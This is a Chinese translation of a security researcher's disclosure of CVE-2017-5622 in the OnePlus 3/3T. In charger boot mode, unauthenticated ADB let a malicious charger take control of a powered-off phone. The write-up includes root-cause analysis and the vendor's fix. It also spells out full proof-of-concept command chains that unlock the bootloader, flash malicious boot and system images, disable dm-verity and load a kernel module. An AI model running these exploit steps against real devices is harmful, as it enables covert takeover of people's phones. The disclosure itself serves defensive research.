> 原文链接: https://www.anquanke.com//post/id/85809 


# 【技术分享】如何通过恶意充电器控制你的OnePlus 3/3T（含演示视频）


                                阅读量   
                                **105319**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：alephsecurity.com
                                <br>原文地址：[https://alephsecurity.com/2017/03/26/oneplus3t-adb-charger/](https://alephsecurity.com/2017/03/26/oneplus3t-adb-charger/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p1.ssl.qhimg.com/t019a30693871743407.jpg)](https://p1.ssl.qhimg.com/t019a30693871743407.jpg)**

****

翻译：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**一、前言**

上个月，我们公布了OnePlus 3/3T中存在的[CVE-2017-5626](https://alephsecurity.com/vulns/aleph-2017003)漏洞（已在OxygenOS 4.0.2中修复），该漏洞允许攻击者在不恢复手机出厂设置前提下，解锁OnePus 3/3T。结合这个漏洞，我们还发现了[CVE-2017-5624](https://alephsecurity.com/vulns/aleph-2017002)漏洞（已在OxygenOS 4.0.3中修复），该漏洞允许攻击者攻击锁定状态下的设备，在不引起用户任何警觉情况下，实现持久化的高权限代码执行，同时也可以在受害者输入凭证后访问用户的隐私数据。然而，从攻击者角度来看，这个漏洞需要物理上接触设备，或通过已授权的ADB接口访问设备。

本文中，我们介绍了OnePlus 3/3T中新发现的一个严重漏洞，漏洞编号为[CVE-2017-5622](https://alephsecurity.com/vulns/aleph-2017004)，OxygenOS 4.0.2及以下系统版本受此漏洞影响。漏洞的利用条件不像之前那般苛刻。该漏洞与CVE-2017-5626结合使用，还可让恶意充电器控制处于关机状态下的用户设备（或者恶意充电器也可以在连接手机后不充电，处于等待状态中，直到手机电量耗尽）。如果与CVE-2017-5624结合使用，攻击者还可以隐藏对设备系统（system）分区的篡改痕迹。

我们已经向OnePlus安全团队报告了CVE-2017-5622漏洞，他们在上个月发布的[OxygenOS 4.0.3](https://forums.oneplus.net/threads/oxygenos-4-0-3-n-ota-for-oneplus-3.497080/)系统版本中修复了该漏洞。感谢OnePlus安全团队对该漏洞的快速有效处理。

<br>

**二、演示视频**

在深入技术细节之前，我们可以先看一下几个PoC的演示视频。

第一个视频演示了恶意充电器如何利用CVE-2017-5622和CVE-2017-5626漏洞来获得root shell、将SELinux设置为permissive模式、甚至执行内核代码：

视频一



第二个视频演示了恶意充电器如何利用CVE-2017-5622、CVE-2017-5624以及CVE-2017-5626三个漏洞替换系统分区，以进一步安装特权应用。请注意，一旦替换攻击过程结束，受害者将无法得知设备已被篡改。

视频二



<br>

**三、充电启动模式下的ADB访问（CVE-2017-5622）**

当人们将关机状态下的OnePlus 3/3T与某个充电器连接时，bootloader会以充电（charger）启动模式加载整个系统平台（换句话说，也就是ro.bootmode = charger）。这种状态下的系统不应该开放任何敏感的USB接口，否则容易受到诸如“Juice-jacking”类型的恶意充电器的攻击。

令我们惊讶的是，第一次连接关机状态下的OnePlus 3/3T时，我们发现设备提供了一个adb访问接口：



```
&gt; adb shell
android:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
android:/ $ getprop ro.bootmode
charger
android:/ $ getprop ro.boot.mode
charger
android:/ $ getprop  | grep -i oxygen
[ro.oxygen.version]: [4.0.2]
android:/ $
```

我们感到非常疑惑，因为这种情况并不常见（也不应该出现）。我们立刻想到了两个问题：

**问题一：为什么ADB会在此时运行？**

这个问题可以在Android的启动过程中找到答案，具体来说，我们可以在init进程所调用的位于boot分区的几个脚本中找到答案。通过ps命令，我们可知init是adbd的父进程：



```
android:/ $ ps -x | grep adb
shell     444   1     12324  564   poll_sched 0000000000 S /sbin/adbd (u:2, s:10)
android:/ $ ps -x  |grep init
root      1     0     15828  2496  SyS_epoll_ 0000000000 S /init (u:6, s:102)
```

因此，我们推测是init进程的某些脚本在设备处于充电启动模式时启动了adbd。仔细观察init.qcom.usb.rc，我们可以看到以下内容：



```
on charger
    [...]
    mkdir /dev/usb-ffs/adb 0770 shell shell
    mount functionfs adb /dev/usb-ffs/adb uid=2000,gid=2000
    write /sys/class/android_usb/android0/f_ffs/aliases adb
    setprop persist.sys.usb.config adb
    setprop sys.usb.configfs 0
    setprop sys.usb.config adb
    [...]
```

当“ro.bootmode == charger”时，“on charger”事件会被触发，这一点我们也可以在Android 7.1.1的init.cpp文件中看到：



```
[...]
std::string bootmode = property_get("ro.bootmode");
if (bootmode == 'charger') `{`
    am.QueueEventTrigger('charger');
`}` else `{`
    am.QueueEventTrigger("late-init");
`}`
[...]
```

因此，init.usb.rc文件中的“sys.usb.config”属性被设置为“adb”，这会导致init进程启动adb：



```
[...]
on property:sys.usb.config=adb &amp;&amp; property:sys.usb.configfs=0
    write /sys/class/android_usb/android0/enable 0
    write /sys/class/android_usb/android0/idVendor 2A70 #VENDOR_EDIT Anderson@, 2016/09/21, modify from 18d1 to 2A70
    write /sys/class/android_usb/android0/idProduct 4EE7
    write /sys/class/android_usb/android0/functions $`{`sys.usb.config`}`
    write /sys/class/android_usb/android0/enable 1
    start adbd
    setprop sys.usb.state $`{`sys.usb.config`}`
[...]
```

**问题二：ADB授权保护机制在哪？**

为了保护设备在启动adbd时不受恶意USB端口（比如恶意充电器）影响，Android早已启用了ADB授权机制（自Jelly-bean开始），在这种机制下，任何尝试使用未授权设备获取ADB会话的行为都会被阻止。

那么，这种情况为什么不适用于OnePlus 3/3T？首先，我们来看看adbd的AOSP实现。在adbd_main函数中，我们可以看到控制ADB授权的几个全局标志，比如auth_required标志：



```
int adbd_main(int server_port) `{`
[...]
    if (ALLOW_ADBD_NO_AUTH &amp;&amp; property_get_bool("ro.adb.secure", 0) == 0) `{`
        auth_required = false;
    `}`
[...]
```

这个标志随后被用于handle_new_connection函数中：



```
static void handle_new_connection(atransport* t, apacket* p) `{`
[...]
    if (!auth_required) `{`
        handle_online(t);
        send_connect(t);
    `}` else `{`
        send_auth_request(t);
    `}`
[...]
`}`
```

因此我们推测，如果OxygenOS系统使用了adbd，那么ro.adb.secure值应该为0，然而事实并非如此：



```
android:/ $ getprop ro.adb.secure
1
android:/ $
```

因此，我们判断OnePlus 3/3T的OxygenOS系统使用了定制版的adbd！由于我们无法获得系统源码，因此我们需要研究从二进制层面研究一下。使用IDA反编译系统镜像，我们可以看到如下信息：



```
__int64 sub_400994()
`{`
[...]
  if ( !(unsigned __int8)sub_440798("ro.adb.secure", 0LL) )
    auth_required_50E088 = 0;
  getprop("ro.wandrfmode", &amp;v95, &amp;byte_4D735C);
  if ( !(unsigned int)strcmp(&amp;v95, &amp;a0_1) || !(unsigned int)strcmp(&amp;v95, &amp;a1_1) || !(unsigned int)strcmp(&amp;v95, &amp;a2) )
    auth_required_50E088 = 0;
  getprop("ro.boot.mode", &amp;v94, &amp;byte_4D735C);
  if ( !(unsigned int)strcmp(&amp;v94, 'charger') )
    auth_required_50E088 = 0;
[...]
`}`
```

我们可以很清楚地看到，OnePlus使用了定制版的adb，使得系统在充电启动模式下时，auth_required值为0（这里顺便提一下，上述代码中的ro.wandrfmode与CVE-2017-5623漏洞有关）。

<br>

**四、漏洞利用**

那么我们可以如何利用这个ADB接口呢？首先，我们应该注意到，即使我们获得了一个shell，我们也无法访问用户数据，因为此时分区处于非挂载和加密状态。然而，我们可以通过“reboot bootloader”命令重启设备，进入fastboot模式，利用CVE-2017-5626漏洞替换boot或者system分区！我们还需要利用CVE-2017-5624漏洞来消除篡改system分区所引起的任何警告信息。如果设备的bootloader已经处于解锁状态，我们甚至用不上CVE-2017-5626漏洞。

回顾一下，CVE-2017-5626漏洞（使用“fastboot oem 4F500301”命令）可以允许攻击者无视OEM Unlocking限制条件，在未经用户确认和不擦除用户数据条件下使用fastboot方式解锁设备，同时，设备在运行此命令后仍会报告自身处于锁定状态。单独使用这个漏洞可以获得内核代码执行权限，但屏幕上会有5秒左右的警告信息。CVE-2017-5624漏洞允许攻击者使用fastboot方式禁用dm-verity，dm-verity防护功能可以防止system分区被篡改。

**PoC 1：恶意充电器获取root shell及内核代码执行权限（CVE-2017-5622/6）**

受害者将处于关机状态的设备连接至恶意充电器，此时攻击者能够获得一个ADB会话（CVE-2017-5622），可以重启设备进入fastboot：



```
&gt; adb shell
android:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
android:/ $ reboot bootloader
&gt; fastboot devices
cb010b5a        fastboot
```

利用CVE-2017-5626漏洞，恶意充电器可以替换boot镜像，使得adbd以root权限运行，SELinux也被设置为permissive模式（参考我们之前的文章）：



```
&gt; fastboot flash boot evilboot.img
target reported max download size of 440401920 bytes
sending 'boot' (14836 KB)...
OKAY [  0.335s]
writing 'boot'...
FAILED (remote: Partition flashing is not allowed)
finished. total time: 0.358s
&gt; fastboot oem 4F500301
...
OKAY [  0.020s]
finished. total time: 0.021s
&gt; fastboot flash boot  evilboot.img
target reported max download size of 440401920 bytes
sending 'boot' (14836 KB)...
OKAY [  0.342s]
writing 'boot'...
OKAY [  0.135s]
finished. total time: 0.480s
```

这样恶意充电器就可以在用户输入凭证信息前，获得一个root权限的shell，不过此时攻击者还无法访问用户数据：



```
OnePlus3:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
OnePlus3:/ # getenforce
Permissive
```

OnePlus 3/3T的内核是在启用LKM条件下编译而成的，因此攻击者不需要修改或重新编译内核就可以运行内核代码。因此，我创建了一个小型内核模块：



```
#include &lt;linux/module.h&gt;
#include &lt;linux/kdb.h&gt;
int init_module(void)
`{`
    printk(KERN_ALERT "Hello From Evil LKMn");
    return 1;
`}`
```

恶意充电器可以将该模块加载到内核中：



```
OnePlus3:/data/local/tmp # insmod ./evil.ko
OnePlus3:/data/local/tmp # dmesg | grep "Evil LKM"
[19700121_21:09:58.970409]@3 Hello From Evil LKM
```

**PoC 2：恶意充电器替换system分区（CVE-2017-5622/4/6）**

这几个漏洞可以组合利用，在不向用户发出任何警告时，获得特权SELinux域中的代码执行权限，也可以访问原始用户数据。为了演示这一利用场景，我修改了system分区，添加了一个特权应用。为了添加特权应用，我们可以将目标APK文件放置于“/system/priv-app/&lt;APK_DIR&gt;”目录，这样该APK就会被添加到priv_app域（特权应用域）中，同时不要忘了使用chcon命令处理这个APK文件及它所处的文件目录。

同样的场景中，受害者将处于关机状态的设备连接至恶意充电器，攻击者通过CVE-2017-5622漏洞获取ADB会话，重启设备进入fastboot模式：



```
&gt; adb shell
android:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
android:/ $ reboot bootloader
&gt; fastboot devices
cb010b5a        fastboot
```

利用CVE-2017-5626漏洞，恶意充电器可以将原始system分区替换为恶意的system分区：



```
&gt; fastboot flash system evilsystem.img
target reported max download size of 440401920 bytes
erasing 'system'...
FAILED (remote: Partition erase is not allowed)
finished. total time: 0.014s
&gt; fastboot oem 4F500301
OKAY
[  0.020s] finished. total time: 0.021s
&gt; fastboot flash system evilsystem.img
target reported max download size of 440401920 bytes erasing 'system'...
OKAY [  0.010s]
...
sending sparse 'system' 7/7 (268486 KB)...
OKAY [  6.748s]
writing 'system' 7/7...
OKAY [  3.291s]
finished. total time: 122.675s
```

使用CVE-2017-5624漏洞，恶意充电器可以禁用dm-verity保护：



```
&gt; fastboot oem disable_dm_verity
...
OKAY
[  0.034s] finished. total time: 0.036s
```

我们可以看到应用的确处于特权应用上下文的环境中：



```
1|OnePlus3:/ $ getprop | grep dm_verity
[ro.boot.enable_dm_verity]: [0]
OnePlus3:/ $ ps -Z | grep evilapp
u:r:priv_app:s0:c512,c768      u0_a16    4764  2200  1716004 74600 SyS_epoll_ 0000000000 S alephresearch.evilapp
```



**五、漏洞修复**

OnePlus通过修改“`{`persist.`}`sys.usb.config”文件，移除“on charger”事件中存在漏洞的条目，成功修复了该漏洞：



```
on charger
    #yfb add  to salve binder error log in poweroff charge
    setrlimit 13 40 40
    setprop sys.usb.config mass_storage
    mkdir /dev/usb-ffs 0770 shell shell
    mkdir /dev/usb-ffs/adb 0770 shell shell
    mount functionfs adb /dev/usb-ffs/adb uid=2000,gid=2000
    write /sys/class/android_usb/android0/f_ffs/aliases adb
    #14(0xe) means reject cpu1 cpu2 cpu3online
    write /sys/module/msm_thermal/core_control/cpus_offlined 14
    #add by david.liu@oneplus.tw 2015/12/22, improve the performance of charging
    write /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor powersave
    write /sys/devices/system/cpu/cpu1/online 0
    write /sys/devices/system/cpu/cpu2/online 0
    write /sys/devices/system/cpu/cpu3/online 0
    #yfb add  to salve binder error log in poweroff charge
    start srvmag_charger
```



**六、OnePlus 2不受此漏洞影响**

OnePlus 2的“init.qcom.usb.rc”文件中，“on charger”事件的“`{`persist`}`.sys.usb.config”属性同样被设置为“adb”：



```
on charger
    mkdir /dev/usb-ffs 0770 shell shell
    mkdir /dev/usb-ffs/adb 0770 shell shell
    mount functionfs adb /dev/usb-ffs/adb uid=2000,gid=2000
    write /sys/class/android_usb/android0/f_ffs/aliases adb
    setprop persist.sys.usb.config adb
[...]
```

“init.rc”文件中情况与此类似：



```
on charger
    mount ext4 /dev/block/bootdevice/by-name/system /system ro
    setprop sys.usb.configfs 0
    load_system_props
    class_start charger
    setprop sys.usb.config adb
```

即便如此，我们对OnePlus 2设备进行测试时，无法获得adb shell，虽然此时设备的USB接口处于开放运行状态：



```
&gt; adb shell
error: device unauthorized.
This adb server's $ADB_VENDOR_KEYS is not set
Try 'adb kill-server' if that seems wrong.
Otherwise check for a confirmation dialog on your device.
&gt; adb devices
List of devices attached
6b3ef4d5        unauthorized
```

因此，OnePlus 2不受此漏洞影响。与OnePlus 3/3T情况相反，OnePlus 2的OxygenOS系统镜像保留了ADB授权机制。对系统镜像的反汇编后，我们发现该系统的确不存在ro.boot.mode以及auth_required被绕过问题。
